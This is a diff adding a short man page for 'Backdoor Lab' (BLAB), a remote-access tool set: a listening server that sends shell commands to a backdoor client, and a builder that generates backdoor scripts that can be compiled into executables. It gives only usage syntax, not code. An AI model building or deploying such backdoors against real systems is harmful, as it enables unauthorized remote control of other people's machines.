@@ -1,0 +1,39 @@
+.TH Backdoor Lab
+.SH NAME
+BLAB Server
+
+.SH DESCRIPTON
+You can use BLAB Server to send remote shell-commands to BLAB Client (BALB Backdoor)
+.SH OPTIONS
+.IP --ip
+use this option to set listening ip
+.IP -p
+use this option to set port for listening on listening IP
+
+
+.SH NAME
+BLAB Backdoor
+.SH DESCRIPTION
+You can test BLAB using blab_backdoor.py
+.SH SYNOPSIS
+python blab_backdoor.py <ip address for connection> <port for connection>
+
+
+.SH NAME
+BLAB Builder
+.SH DESCRIPTION
+You can use BLAB Builder to build a backdoor to python-script (you can compile it to executable with PyInstaller)
+.SH OPTIONS
+.IP --connection-ip
+use this optiin to select IP for connection
+.IP -p 
+use this option to select port for connection
+.SH SYNOPSIS
+python blab_builder.py --connection-ip <ip for connection> -p <port for connection> <filename for saving backdoor>
+
+.SH AUTHOR
+BlackHat LTD.
+
+Vladislav Kotov (DOCTOR_RABB)
+
+Anton Carev
